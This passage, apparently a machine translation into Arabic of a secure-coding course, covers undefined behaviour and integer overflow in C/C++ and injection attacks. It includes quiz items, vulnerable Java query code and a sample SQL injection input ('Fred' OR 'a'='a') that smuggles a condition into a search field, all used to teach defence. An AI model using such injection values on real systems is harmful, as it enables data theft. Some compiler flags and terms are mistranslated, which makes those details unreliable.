تحتوي العديد من اللغات على الأقل على بعض السلوكيات غير المحددة ، وبالتالي ، إذا كنت تستخدم هذه اللغات ، فأنت بحاجة إلى معرفة ماهيتها وتجنبها. تحتوي C و C ++ على عدد كبير بشكل خاص من السلوكيات غير المحددة. على سبيل المثال ، بالنسبة ل C ، هناك المئات من السلوكيات غير المحددة. وتتألف القائمة من 11 صفحة في المسودة النهائية المتاحة للجمهور في [الملحق J.2 C18.](https://web.archive.org/web/20181230041359if_/http://www.open-std.org/jtc1/sc22/wg14/www/abq/c17_updated_proposed_fdis.pdf) كما أنه من السهل جدا في C و C ++ كتابة التعليمات البرمجية التي لها سلوك غير محدد عن طريق الخطأ.  لقد رأينا بالفعل بعض الأمثلة على السلوك غير المحدد: يقرأ ويكتب خارج حدود المخزن المؤقت ، والاستخدام بعد الحر ، والمجاني المزدوج. هنا عدد قليل.

في C و C ++ ، يكون مرجع المؤشر الفارغ غير محدد أيضا (على سبيل المثال ، تقييم "**&# 42 ؛ p**" عندما **يكون p** هو **NULL**). هذا يعني أن محاولة إلغاء الإشارة إلى مؤشر فارغ لا تؤدي بالضرورة إلى محاولة قراءة قيمة غير صالحة ، فقد يفعل البرنامج *أي شيء* على الإطلاق.

 * يعد مرجع المؤشر الفارغ* ([CWE-476](https://cwe.mitre.org/data/definitions/476.html)) سببا شائعا للثغرات الأمنية لدرجة أنه 2021 CWE Top 25 # 15 و 2019 CWE Top 25 # 14.

في C و C ++ ، يكون تجاوز عدد صحيح موقع غير محدد (على سبيل المثال ، **int** مع  قيمة **MAX_INT** مع إضافة 1 إليها). ليس هناك ما يضمن أن الأعداد الصحيحة الموقعة تلتف ؛ بدلا من ذلك ، قد يفعل البرنامج أي شيء على الإطلاق.

 يعد تجاوز عدد صحيح أو التفاف سببا شائعا للثغرات الأمنية لدرجة أنه 2021 CWE Top 25 # 12 و 2019 CWE Top 25 # 8. إنه [CWE-190](https://cwe.mitre.org/data/definitions/190.html) * أو تجاوز عدد صحيح أو التفاف* (على الرغم من أن CWE يغطي أيضا التفافا غير موقع ، والذي يتم تعريفه في C و C ++).

ربما أصبح من الواضح الآن لماذا يوصي الكثير من الناس بتجنب C و C ++ إذا كان يجب أن يكون الرمز آمنا. لأسباب متنوعة ، من الصعب كتابة برامج آمنة بهذه اللغات! ولكن مرة أخرى ، هناك *أسباب* تجعل الناس يختارون هذه اللغات ، وبالطبع ، إذا كان هناك شيء مكتوب بالفعل بهذه اللغات ، فمن الصعب تغييره.

لذلك ، إذا كنت تستخدم C و C ++ ، فهناك طرق يمكنك من خلالها تقليل المخاطر. لقد ناقشنا بالفعل بعض الخيارات. وهنا عدد قليل أكثر:

* اقرأ معاييرها بعناية حتى تعرف جميع السلوكيات الشائعة غير المحددة وتجنبها بنشاط عند كتابة التعليمات البرمجية.

* قم بتشغيل التحذيرات حول السلوكيات غير المحددة. تتضمن أمثلة أعلام دول مجلس التعاون الخليجي و / أو clang ** -fsanitize = signed-overflow** (تحذير من تجاوز السعة الموقع) ، -ftrapv (**الفخاخ الموقعة عدد صحيح تجاوزات) ، ** -fsanitize = العنوان ، -fsanitize = غير محدد** ، و **  -**fcatch-undefined-behavior** (لكنه لن يكتشفها دائما!)****

* إجبار المترجم على تعيين معنى للسلوكيات غير المحددة رسميا. يجب ألا تعتمد على هذه ، لكنها ستقلل من تأثير ارتكاب خطأ. تتضمن أمثلة أعلام دول مجلس التعاون الخليجي و / أو clang  -fwrapv ** (التفاف الأعداد الصحيحة عند تجاوز السعة) و ** -fno-delete-null-pointer-checks و ** -fno-strict-overflow**.****

سنناقش لاحقا استخدام الأدوات لمحاولة اكتشافها ، ولكن كن حذرا: معظم الأدوات في أحسن الأحوال تكتشف *بعض* السلوكيات غير المحددة ، وليس كلها. أفضل دفاع لك هو استخدام لغة بدون سلوكيات غير محددة أو قليلة منها. عندما لا يكون ذلك معقولا ، تعرف بالضبط على ما لم يتم تعريفه ، واكتب التعليمات البرمجية بعناية حتى لا تعتمد على سلوكيات غير محددة.

#### اختبار 2.6: تجنب السلوك غير المحدد

\>\>في C و C ++ ، لا يمثل مرجع المؤشر الفارغ مشكلة أمنية خطيرة ، لأنك ستقرأ فقط قيمة بيانات أو ، في أسوأ الأحوال ، تعطل البرنامج. صواب أم خطأ؟<<

( ) صحيح

(x) خطأ

[تفسير]

لا ، في C و C ++ ، مرجع المؤشر الفارغ هو سلوك غير محدد. قد يتسبب أي سلوك غير محدد في حدوث أي شيء سيء ، بما في ذلك مسح جميع الملفات أو عرض جميع المفاتيح السرية أو أي شيء آخر. من المرجح أن تتسبب في مشكلة دقيقة ، ولكن هذه المشكلة الدقيقة قد تكون أيضا ثغرة أمنية خطيرة.

[تفسير]

## معالجة البيانات بشكل آمن: احسب بشكل صحيح

### تجنب تجاوز عدد صحيح والتفاف وتدفق سفلي

من الشائع حساب الأعداد الصحيحة في البرامج ، مثل الزيادة المستمرة (إضافة 1 إلى) متغير. ومع ذلك ، لا يمكن لأي جهاز كمبيوتر التعامل مع عدد لا حصر له من الأرقام. في الواقع ، تستخدم العديد من لغات البرمجة عددا ثابتا من البتات في أنواع الأعداد الصحيحة الأكثر شيوعا ، وبالتالي فإن الحد الأدنى والحد الأقصى للأعداد الصحيحة لها نطاق أصغر بكثير مما يمكن أن يمثله الكمبيوتر.

إذا تمكن المهاجم من التسبب في تجاوز حساب عدد صحيح نطاق تمثيل العدد الصحيح ، فقد تكون النتيجة ثغرة أمنية. نظرا لأن الحسابات الصحيحة شائعة ، وغالبا ما ينسى المطورون أن أجهزة الكمبيوتر لا يمكنها في الواقع التعامل مع عدد لا حصر له من الأرقام ، فهذه نقطة ضعف شائعة نسبيا.

كما أشرنا بالفعل ، في C و C ++ ، يجب عليك كتابة برنامجك حتى لا يتسبب المهاجم في تجاوز أنواع الأعداد الصحيحة الموقعة المعتادة (مثل int) أو عدم تجاوزها. عادة ما يكون تجاوز سعة عدد صحيح موقع أو انخفاض التدفق سلوكا غير محدد في C و C ++ ، ويسمح للبرنامج بفعل أي شيء على الإطلاق عند حدوثه (بما في ذلك تشغيل ثغرة أمنية).

في C و C ++ ، يلتف الفائض أو الفائض عدد صحيح غير موقع في تمثيله الأساسي (عادة ما يكون مكمل اثنين). لذلك في C و C ++ ، من المعتاد أن تؤدي إضافة 1 إلى أكبر قيمة غير موقعة قابلة للتمثيل إلى إنتاج 0. في العديد من لغات البرمجة الأخرى ، يتم تخزين كل من الأعداد الصحيحة الموقعة وغير الموقعة بطول ثابت والتفاف حولها عند الفائض والتدفق السفلي (عادة في تكملة اثنين). هذا ليس دائما شيئا جيدا. إذا كان بإمكان المهاجم أن يتسبب في تدفق أو تجاوز السعة ، وإذا لم يكن البرنامج مصمما للتعامل معه ، فقد تكون النتيجة في كثير من الأحيان ثغرة أمنية.

تتحول بعض لغات البرمجة تلقائيا إلى تنسيقات عدد صحيح "كبير العدد" حسب الحاجة لدعم عدد عشوائي من الأرقام ، بدلا من استخدام عدد ثابت من البتات لتمثيل عدد صحيح. تتضمن لغات البرمجة هذه Python و Ruby و Scheme. توفر العديد من لغات البرمجة الأخرى دعما لمثل هذه التنسيقات ، مثل المكتبة ، على الرغم من أنك قد تحتاج إلى طلب استخدام هذا التنسيق على وجه التحديد (على سبيل المثال ، كنوع). لا يمكن لهذه التنسيقات أن تدعم عددا لا حصر له من الأرقام ، نظرا لعدم وجود جهاز كمبيوتر يحتوي على ذاكرة لا نهائية ، ولكن هذا يقلل بشكل كبير من مخاطر حدوث مثل هذه المشكلات. في كثير من الحالات ، يتم رفع استثناء إذا نفدت مساحة الحساب ، لذا تأكد من أن البرنامج يمكنه التعامل مع هذا الاستثناء بشكل صحيح. المشكلة الشائعة هي أن البرامج غالبا ما تحتاج إلى استدعاء روتين مكتوب بلغة برمجة مختلفة ، وخلال هذا التحويل قد يتم تحويل الرقم إلى تنسيق ثابت العرض لا يمكنه تخزين القيمة (وبالتالي إعادة إنشاء المشكلة).

لغة برمجة جافا سكريبت هي حالة غير عادية. لا توفر مواصفات JavaScript ، المسماة ECMAScript ، دعما مباشرا للأعداد الصحيحة. بدلا من ذلك ، يتم تمثيل الأعداد الصحيحة عادة باستخدام أرقام الفاصلة العائمة. كما هو مذكور في مواصفات لغة ECMAScript (قسم "نوع الرقم") ، هذا يعني أن نوع رقم JavaScript يمكن أن يمثل بدقة جميع الأعداد الصحيحة الرياضية الموجبة والسالبة التي لا يزيد حجمها عن 2<sup>53</sup>. ومع ذلك ، إذا تمكن المهاجم من التسبب في تجاوز الأعداد الصحيحة المحسوبة لهذا النطاق ، فقد تحدث أشياء غريبة. على سبيل المثال ، من المحتمل أن تؤدي زيادة عدد صحيح موجب يتجاوز هذه القيمة إلى نتيجة غير متغيرة ، نظرا لأن النوع الأساسي لا يمكنه تخزين كل رقم. هناك أيضا بعض العوامل التي تتعامل فقط مع الأعداد الصحيحة في نطاقات محددة (مثل -2 31 <sup> حتى 2 </sup>31-1<sup></sup> ضمنا ، أو 0 إلى 2<sup>16-1</sup> ضمنا) ؛ تأكد من أن المهاجم لا يمكنه التسبب في تجاوز هذه النطاقات قبل الاتصال بعوامل التشغيل هذه. لمزيد من المعلومات ، راجع [مواصفات اللغة ECMAScript ® 2021](https://www.ecma-international.org/publications-and-standards/standards/ecma-262/) من ECMA.

تتمثل إحدى أبسط الطرق لضمان عدم تمكن المهاجم من تشغيل الثغرات الأمنية من تجاوز الأعداد الصحيحة وانخفاض التدفقات في التحقق من صحة الإدخال على جميع الأرقام غير الموثوق بها. في جميع عمليات التحقق من صحة المدخلات هذه ، قم بفرض الحد الأدنى والحد الأقصى للقيم على جميع الأعداد الصحيحة غير الموثوق بها بحيث لا يمكن أن تؤدي المدخلات المقبولة إلى عملية حسابية من شأنها أن تؤدي إلى تجاوز عدد صحيح أو انخفاض في التدفق. إذا تم ذلك ، فلا يمكن أن يكون هناك أي نقاط ضعف من هذا القبيل. إذا لم يكن بالإمكان القيام بذلك ، فسيحتاج البرنامج إلى اكتشاف التدفقات الزائدة والسفلية للأعداد الصحيحة التي يمكن أن يشغلها المهاجم ، إما قبل الحساب أو بعده ، والتعامل معها بشكل مناسب.

>  وقت القصة: نت يو إس بي CVE-2021-45608

> مثال على تجاوز عدد صحيح يؤدي إلى ثغرة أمنية  هو CVE-2021-45608 [، كما هو موضح في "](https://nvd.nist.gov/vuln/detail/CVE-2021-45608)CVE-2021-45608 [| عيب NetUSB RCE في الملايين من أجهزة توجيه المستخدم النهائي](https://www.sentinelone.com/labs/cve-2021-45608-netusb-rce-flaw-in-millions-of-end-user-routers/)" بواسطة Sentinel Labs.  تحتوي وحدة KCodes NetUSB kernel ، المستخدمة من قبل عدد كبير من بائعي أجهزة الشبكة ، على ثغرة أمنية في تجاوز عدد صحيح. أخذت الوحدة طولا غير موثوق به يوفره العميل ، وأضافت 0x11 ، وخصصت هذا المقدار من الذاكرة. إذا كان الطول المطلوب كبيرا (على سبيل المثال ، كل 1s في ثنائي) ، فإن الإضافة ستلتف حولها ، مما يتسبب في تخصيص صغير جدا. بعد ذلك ، سيتم تفريغ البيانات في المخزن المؤقت الصغير جدا ، مما يؤدي إلى تجاوز سعة المخزن المؤقت.
>
> يوضح هذا أنه من المهم التحقق من الالتفاف عند استخدام البيانات التي يتحكم فيها المهاجم ، خاصة إذا كنت تستخدمها لاتخاذ قرارات الحجم أو خارج النطاق. يمكن تعلم قواعد أخرى أيضا. أولا ، تحقق دائما من صحة البيانات من مصدر غير موثوق به (على سبيل المثال ، بيانات من الإنترنت) - لم يكن هناك سبب للسماح بأي طلب تخصيص بهذا الحجم. ثانيا، استمعت هذه الوحدة إلى الطلبات الواردة من الشبكة الواسعة النطاق (WAN) بدلا من شبكة المنطقة المحلية فقط (LAN)؛ يجب أن يقلل البرنامج من الامتياز إلى ما هو مطلوب فقط لتقليل احتمالية أو تأثير الضرر إذا كانت هناك ثغرة أمنية.


 يعد تجاوز عدد صحيح أو التفاف سببا شائعا للثغرات الأمنية لدرجة أنه 2021 CWE Top 25 # 12 و 2019 CWE Top 25 # 8. إنه [CWE-190 ](https://cwe.mitre.org/data/definitions/190.html)، *تجاوز عدد صحيح أو ملفوف*.

#### اختبار 2.7: تجنب تجاوز عدد صحيح ، والتفاف ، وتدفق سفلي

>>يمكن تجاهل تجاوزات عدد صحيح عند التعامل مع البيانات غير الموثوق بها. صواب أم خطأ؟<<

( ) صحيح
(x) خطأ

[تفسير]لا. يختلف نطاق القيم المحتملة حسب اللغة والأنواع المستخدمة ، ولكن يمكن للمهاجمين أحيانا استغلال تجاوزات عدد صحيح.[تفسير]


# الاتصال ببرامج أخرى

يصف هذا الفصل كيفية استدعاء البرامج الأخرى بشكل آمن ، بما في ذلك كيفية مواجهة هجمات الحقن (بما في ذلك حقن SQL وحقن أوامر نظام التشغيل) وكيفية التعامل مع أسماء الملفات / أسماء المسارات بشكل صحيح.

أهداف التعلم:

1. ناقش أساسيات الاتصال بالبرامج الأخرى بأمان.

2. فهم كيفية مواجهة هجمات الحقن (بما في ذلك حقن SQL وحقن أوامر نظام التشغيل).

3. ناقش التعامل السليم مع أسماء الملفات / أسماء المسارات.

## مقدمة لبرامج الاتصال الآمن

### مقدمة في برامج الاتصال الآمن - الأساسيات

عدد قليل جدا من البرامج مكتفية ذاتيا تماما. تقريبا جميع البرامج تستدعي برامج أخرى. يتضمن ذلك البرامج المحلية ، مثل البرامج التي يوفرها نظام التشغيل ، ومكتبات البرامج المضمنة لتلك اللغة ، والبرامج من مستودعات الحزم (مثل npm و PyPI و maven). غالبا ما تستدعي الأنظمة الحديثة من خلال شبكة خدمات أخرى ، وتقدم طلبات من خلال واجهات برمجة تطبيقات مختلفة (مثل واجهات برمجة تطبيقات REST و GraphQL) وتتلقى البيانات بتنسيقات مثل JSON و XML. ثم تقوم جميع هذه البرامج تقريبا باستدعاء برامج أخرى. في كثير من الأحيان ، لا تكون هذه المكالمات غير المباشرة واضحة (على سبيل المثال ، الاتصال بمكتبة كتبها شخص آخر) أو تنطوي على قدر كبير من البنية التحتية "المخفية".

يجب أن تكون حذرا بشأن البرامج التي تختار استخدامها (الثقة) وإدارتها (على سبيل المثال ، كيفية تسجيلها وتحديثها). بمجرد اختيارها ، يجب أن تكون حذرا بشأن كيفية استخدام هذه البرامج الأخرى. في هذا القسم ، سنتحدث عن استخدام ** برامج أخرى بشكل آمن.

أولا ، ما هو واضح: إذا كان من المعروف أن البرنامج غير آمن ، والأمان مهم ، فلا تستخدمه! لكن عادة ، لا تستخدم برنامجا غير آمن معروف ، لذلك دعنا نتجاوز ذلك.

إذا كانت هناك طريقة سهلة نسبيا للحد من امتيازات الروتين الذي تتصل به ، فافعل ذلك. إذا كان بإمكانك *تقييد* الامتيازات الممنوحة ، فعندئذ ، إذا اخترق المهاجم ، يكون الضرر أكثر محدودية وقد يجعل من الصعب على المهاجم التسبب في المزيد من الضرر. هذا مثال آخر على مبدأ الأمان الأقل امتيازا. على سبيل المثال، إذا كنت تستدعي قاعدة بيانات، حاول تقييد امتيازات قاعدة البيانات للبرنامج الذي يقدم الطلب. إذا كنت تستخدم SQL ، ففكر في استخدام  الأمر **GRANT** بحيث يكون للبرنامج الطالب امتيازات أقل.

مبدأ مفيد هو استدعاء روتين بقيم صالحة فقط. إذا كان الروتين يتطلب أن يكون الرقم من 0 إلى 9 ، فلن يكون من الممكن للمهاجم أن يتسبب في إرسال 50. هذا أسهل من الناحية النظرية منه في الممارسة العملية ، خاصة وأن هذه الحدود ليست دائما موثقة جيدا. ولكن عندما تعرف وجود قيود ، فكر في إجراء بعض الفحوصات للتأكد من احترامها ، أو اكتب برنامجك بحيث يتم احترام القيود بالضرورة.

مبدأ مهم للغاية هو أنه إذا كان من الصعب استخدام الروتين بشكل آمن ، وهناك طريقة أخرى للقيام بالمهمة التي يسهل القيام بها  بشكل آمن ، *فاستخدم الروتين الأسهل في الاستخدام بشكل آمن*. فيما يلي بعض العلامات التحذيرية التي تشير إلى أنك تستخدم روتينا يصعب استخدامه بشكل آمن:

* يقوم بتنفيذ أي برنامج يتم إرساله إليه ، وقد تأتي بعض البيانات التي ترسلها من مهاجم. أي روتين يحمل اسما مثل **eval () أو **exec** () أو **execute** () أو **system()** لديه ** فرصة كبيرة ليكون في هذه الفئة. على سبيل المثال ، لا تستخدم **eval**() في JavaScript لمعالجة بيانات JSON (بشكل عام!) ؛ استخدم شيئا أكثر أمانا مثل وظيفة JavaScript JSON.parse()**.**

* يتطلب منك ربط سلاسل ثابتة بالبيانات التي قد تأتي من مهاجم. بشكل عام ، يجب الهروب من البيانات الأخرى من الهجوم ، ومن السهل ارتكاب خطأ عند الهروب من البيانات.

* يتم وصف تنسيق الإدخال الخاص به باستخدام مواصفات اللغة (مثل نموذج Backus-Naur).

* كان الغرض منه هو التفاعل البشري المباشر ، وليس لبرنامج لاستدعائه.

يمكنك ** استخدام مثل هذه الإجراءات بشكل آمن ، وأحيانا تحتاج إلى ذلك. ولكن إذا تمكنت من تجنب ذلك ، فمن المحتمل أن يكون برنامجك أكثر أمانا - وربما يكون من الأسهل صيانته أيضا. إذا لم تتمكن من تجنبها ، فقد ترغب في لف استخدامها في أغلفة خاصة لتسهيل استخدامها بأمان.

لماذا يصعب استخدام أنواع معينة من الإجراءات الروتينية بشكل آمن؟ تتمثل إحدى المشكلات الشائعة في أن العديد من الإجراءات الروتينية تقبل اللغات ذات * الأحرف الوصفية* - أي الأحرف التي تغير كيفية تفسير الأحرف الأخرى بدلا من أن تكون بيانات بحد ذاتها. على سبيل المثال ، غالبا ما يكون حرف الاقتباس المزدوج (**"**) حرفا وصفيا (بما في ذلك في SQL و shell). إذا كانت هناك مواصفات لغوية ، فهذا يعني بالتأكيد وجود أحرف وصفية. يعد دعم الأحرف الوصفية مرنا للغاية ، وإذا كانت جميع المدخلات موثوقة ، فهذه ليست مشكلة. ولكن عندما تكون أجزاء من البيانات من مهاجم ، يجب أن تكون حذرا للغاية وأن تتخذ احتياطات إضافية. إذا تمكن المهاجم من إدراج أحرف وصفية في الإدخال ، ولم يتم الهروب منها بشكل صحيح تماما ، فغالبا ما تتبع نقاط الضعف الخطيرة وسهلة الاستغلال إذا تمت قراءتها بواسطة نوع من المترجمين. تسمى هذه الأنواع من الهجمات أحيانا هجمات الحقن.

تعد نقاط الضعف في هجمات الحقن أخطاء شائعة في تطبيقات الويب لدرجة أن "الحقن" هو 2017 OWASP Top 10 # 1 و 2021 OWASP Top 10 # 3. تم تحديد 2021 CWE Top 25 # 28 و 2019 CWE Top 25 # 18 CWE-94 ، [التحكم غير السليم في إنشاء التعليمات البرمجية ("حقن الكود").](https://cwe.mitre.org/data/definitions/94.html) 2021 CWE Top 10 # 25 هو CWE-77 * *[، ](https://cwe.mitre.org/data/definitions/77.html) *التحييد غير الصحيح للعناصر الخاصة المستخدمة في الأمر ("حقن الأوامر")* . كل من CWE-94 و CWE-77 هي حالات خاصة من CWE-74[](https://cwe.mitre.org/data/definitions/74.html). * التحييد غير الصحيح للعناصر الخاصة في الإخراج المستخدم بواسطة مكون المصب ("الحقن").* تحتوي الفئة العامة CWE-74 على حالات خاصة شائعة أخرى مثل ثغرات حقن SQL (CWE-89) [وحقن أوامر نظام التشغيل (](https://cwe.mitre.org/data/definitions/89.html)CWE-78[) التي سنناقشها قريبا.](https://cwe.mitre.org/data/definitions/78.html)

لذلك تحتاج إلى التأكد من أنه عند إرسال البيانات إلى بعض البرامج (أو المخرجات) ، فإنك ترسلها بطريقة آمنة. وقد يشمل ذلك ما يلي:

* **التعقيم**<br>إزالة أي حرف غير قانوني أو يحتمل أن يكون ضارا (عادة ما يكون أحرف وصفية) من البيانات.

* **الهروب تعديل**<br> الأحرف (بعض الأحرف الأولية) بحيث لا يتم تفسيرها بشكل غير صحيح.

* **التطبيع**<br>تغيير شكل البيانات ليكون شكلا شائعا (وكأثر جانبي ، يمنعه من التسبب في مشكلة أمنية).

حيثما أمكن ، استخدم المكتبات وواجهات برمجة التطبيقات التي تقوم بذلك نيابة عنك ؛ فهي أسهل في الاستخدام بشكل آمن.

دعنا الآن نفحص بعض حالات هجوم الحقن الشائعة وكيفية التعامل معها بشكل آمن. مرة أخرى ، تكون ثغرة الحقن عندما يقبل البرنامج بيانات من مهاجم ويسلم تلك البيانات بشكل غير صحيح إلى مترجم الأوامر. تحدث بعض المشكلات الأكثر شيوعا عندما يتم إرسال هذه البيانات إلى نظام قاعدة بيانات (هجمات حقن SQL) أو مترجم أوامر نظام التشغيل (هجمات حقن أوامر نظام التشغيل) ، لذلك سنركز عليها. بمجرد أن تفهم كيفية التعامل مع هاتين الحالتين الشائعتين ، سيكون من الواضح أكثر كيفية التعامل بشكل صحيح مع المترجمين الفوريين الآخرين الذين لن نغطيهم هنا (على سبيل المثال ، بروتوكول الوصول الخفيف إلى الدليل (LDAP)). سنبدأ بمناقشة إرسال البيانات إلى أنظمة قواعد البيانات ، والتي غالبا ما تكون عرضة لهجمات حقن SQL.

#### اختبار 3.1: مقدمة لبرامج الاتصال الآمن - الأساسيات

\>\> ما عليك سوى اختيار برنامج آمن لإعادة استخدامه ، وسيكون تطبيقك آمنا. صواب أم خطأ؟<<

( ) صحيح

(x) خطأ

[تفسير]

هذا غير صحيح. من الواضح ، إذا اخترت  برنامجا *غير آمن* معروف  ، فستواجه مشكلة. بالإضافة إلى ذلك ، يجب أن تفضل البرامج التي يسهل استخدامها بشكل آمن. ولكن بشكل عام ، تحتاج إلى *استخدام* البرامج المعاد استخدامها بطريقة آمنة - وليس فقط اختيار المكونات الآمنة.

[تفسير]

## استدعاء البرامج الأخرى: الحقن وأسماء الملفات

### حقن SQL

#### ثغرة حقن SQL

![نص بديل للصورة](exploits_of_a_mom.png)

**مآثر أمي ، **تم استردادها من [xkcd.com](https://xkcd.com/327/) ، مرخصة بموجب [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

تتضمن معظم أنظمة قواعد البيانات لغة يمكن أن تتيح لك إنشاء استعلامات عشوائية ، وعادة ما تكون العديد من الوظائف الأخرى أيضا (على سبيل المثال ، إنشاء الأشياء وتعديلها). لغة SQL شائعة بشكل خاص ، وبينما تستخدم بعض أنظمة قواعد البيانات لغات أخرى ، غالبا ما يكون لهذه اللغات الأخرى أوجه تشابه مع SQL. تتضمن هذه اللغات ، بما في ذلك SQL ، أحرف وصفية. عندما يتمكن المهاجمون من إدراج أحرف التعريف في أمر SQL للتسبب في مشكلة أمنية، يطلق على الهجوم هجوم *حقن SQL*، وتسمى الثغرة الأمنية *ثغرة أمنية لحقن SQL*. يتم اختصار حقن SQL أحيانا باسم SQLi.

حتى إذا لم تكن لغة قاعدة البيانات SQL ، إذا كانت هجوما على لغة لنظام قاعدة بيانات ، فغالبا ما يطلق عليها هجوم حقن SQL (على الرغم من أن هذا غير دقيق تقنيا). سنركز على SQL ، لأن SQL شائع جدا وبمجرد فهمك لكيفية مواجهة هجمات حقن SQL ، من السهل تعميم ذلك على أي لغة قاعدة بيانات.

هنا مثال تافه. فيما يلي مقتطف من Java يحاول إجراء استعلام SQL ، ولكنه يفعل ذلك بشكل غير آمن:

~~~~java
    String QueryString = "select * from authors where lastname = ' " + search_lastname + " '; "; // VULNERABLE CODE
    rs = statement.executeQuery(QueryString); // VULNERABLE CODE
~~~~

القصد واضح. إذا **كان search_lastname** القيمة **فريد** ، فستتلقى قاعدة البيانات الاستعلام "**حدد * من المؤلفين حيث lastname = 'Fred' ؛** " - استعلام SQL معقول. لكن تذكر علامات التحذير الخاصة بنا - هذا الرمز يتسلسل السلاسل ، وربما يتم توفير بعض هذه البيانات بواسطة مهاجم ، ونحن نفعل شيئا يسمى "تنفيذ".  علامات التحذير صحيحة. تخيل أن المهاجم يوفر الإدخال "**Fred" أو 'a' = 'a**". سيؤدي ذلك إلى إنتاج الاستعلام "**select * من المؤلفين حيث lastname = 'Fred' OR 'a' = 'a' ؛** " والآن يمكن للمهاجم استرداد قاعدة البيانات بأكملها. يمكن للمهاجم تعديل البيانات أو حذفها بهذه الطريقة ، اعتمادا على عوامل مختلفة. هذا مثال بسيط على هجوم حقن SQL ؛ يمكن للمهاجم إدراج بعض الأحرف وإدخال أوامر جديدة أو معدلة.

هناك العديد من الطرق لتشغيل هجمات حقن SQL ؛ يمكن للمهاجمين إدراج علامات اقتباس مفردة (تستخدم لإحاطة بيانات الأحرف الثابتة) ، والفواصل المنقوطة (التي تعمل كفواصل للأوامر) ، و "**--**" وهو رمز مميز للتعليق ، وما إلى ذلك. هذه ليست قائمة كاملة. تفسر أنظمة قواعد البيانات المختلفة الأحرف المختلفة بشكل مختلف. على سبيل المثال ، غالبا ما تكون علامات الاقتباس المزدوجة عبارة عن أحرف وصفية ، ولكن بمعاني مختلفة. حتى الإصدارات المختلفة من *نفس* نظام قاعدة البيانات ، أو تكوينات مختلفة ، يمكن أن تسبب تغييرات في كيفية تفسير الأحرف. نحن نعلم بالفعل أنه لا ينبغي لنا إنشاء قائمة بالشخصيات "السيئة" ، لأن هذه قائمة مرفوضة. يمكننا إنشاء قائمة مسموح بها من الأحرف التي نعرف أنها ليست أحرف وصفية ثم الهروب من الباقي ، ولكن من الصعب القيام بهذه العملية بشكل صحيح ل SQL.

لا تقم بتسلسل السلاسل لإنشاء استعلام DBMS، لأن ذلك غير آمن بشكل افتراضي. يتضمن ذلك استخدام سلاسل التنسيق ، واستيفاء السلسلة ، وقوالب السلسلة ، وجميع الآليات الأخرى التي تقوم ببساطة بتسلسل النص. على سبيل المثال ، تحدث نفس الثغرات الأمنية إذا كنت تستخدم حرفي سلسلة بتنسيق  Python (سلاسل f مثل f'{year}-{month}') ، أو طريقة Python ، أو <tt> سلاسل قالب JavaScript</tt> () ، أو استيفاء سلسلة PHP ("$ {year}-${month}") ، أو استيفاء سلسلة Ruby ("`.format`#{year}<tt>`${year}-${month}`</tt>-<tt>#{month}")</tt> ، أو <tt> قوالب Go (string) ،</tt> أو أي قالب أو لغة تنسيق أخرى قائمة على السلسلة. تذكر أننا نريد محاولة استخدام روتين سهل الاستخدام بشكل آمن ، وكل هذه الأمور خطيرة افتراضيا عند استخدامها لإنشاء أوامر مثل أوامر SQL.

يحاول العديد من المطورين إصلاح هذا بطريقة غير حكيمة عن طريق استدعاء روتين الهروب على كل قيمة ، على سبيل المثال ، مثل هذا:

~~~~java
    String QueryString = "select * from authors where lastname = ' " +
                         sql_escape(search_lastname) + " '; "; // BAD IDEA
~~~~

هذا النهج (استدعاء روتين الهروب في كل مرة تستخدم فيها مدخلات غير موثوق بها)
لديه عيب أساسي: الافتراضي ** غير آمن.
إذا كان يجب استدعاء روتين الهروب في كل مرة يتم فيها استخدام بيانات غير موثوق بها ،
وهناك العديد من الاستخدامات للبيانات غير الموثوق بها ،
في النهاية سوف ينسى شخص ما استدعاء وظيفة الهروب.
تقوم العديد من البرامج بإنشاء العديد من الاستعلامات ، لذلك هناك العديد من الفرص
ننسى أن تفعل ذلك.
يمكن أن يحدث الخطأ في البداية ، أو في وقت لاحق عندما يتم تعديل الرمز ،
لكن التجربة تظهر أن الخطأ *سيحدث*.

>  وقت القصة: أنظمة الدفع هارتلاند / حقن SQL

> في أواخر عام 2007 ، استخدم المهاجمون هجوم حقن SQL لاختراق قاعدة بيانات Heartland Payment Systems (المعروفة أيضا باسم "Heartland"). في ذلك الوقت ، عالجت هارتلاند معاملات بطاقات دفع 100 مليون شهريا ل 175,000 تاجر. استخدم المهاجمون حقن SQL لإدراج التعليمات البرمجية في البرامج النصية للويب التي تستخدمها صفحة تسجيل الدخول إلى الويب. استخدم المهاجمون في النهاية هذا القبول لتثبيت برنامج تجسس يسمى "الشم" الذي التقط بيانات البطاقة أثناء معالجة المدفوعات لعدة أشهر في عام 2008. نتيجة لذلك ، فقدت هارتلاند مؤقتا امتثالها لمعيار أمان بيانات صناعة بطاقات الدفع (PCI DSS) ، والذي كان مطلوبا لتنفيذ أعمالها الأساسية المتمثلة في معالجة مدفوعات البطاقات. وبحسب ما ورد اضطرت هارتلاند إلى دفع 145 مليون دولار كتعويض عن المدفوعات الاحتيالية ("[اتجاهات خرق البيانات: ماذا تفعل بعد الهجوم" بقلم ديان ريتشي](https://www.securitymagazine.com/articles/86071-data-breach-directions-what-to-do-after-an-attack)). وقد اتخذوا منذ ذلك الحين العديد من الخطوات لجعل أنظمتهم أقوى وأكثر قوة في محاولة لمنع تكرارها.

 حقن SQL هو حالة خاصة من هجمات الحقن ، وقد لاحظنا بالفعل أن هجمات الحقن شائعة وخطيرة لدرجة أنها 2017 OWASP Top 10 # 1. يعد حقن SQL على وجه التحديد سببا شائعا للثغرات الأمنية لدرجة أن حقن SQL فقط هو 2021 CWE Top 25 # 6 و 2019 CWE Top 25 # 6. يتم تعريف حقن SQL أيضا على أنه [CWE-89 ](https://cwe.mitre.org/data/definitions/89.html)، *التحييد غير الصحيح للعناصر الخاصة المستخدمة في أمر SQL ("حقن SQL").*

مرة أخرى ، نريد أن نحاول استخدام نهج سهل الاستخدام بشكل صحيح - يجب أن يكون آمنا افتراضيا.

بالنسبة لقواعد البيانات ، هناك حلول معروفة يسهل استخدامها بشكل آمن.

#### حلول حقن SQL

تعد نقاط الضعف في حقن SQL واحدة من أكثر نقاط الضعف شيوعا وتدميرا ، خاصة في تطبيقات الويب. كما أنه من السهل مواجهتها ، بمجرد أن تعرف كيفية القيام بذلك.

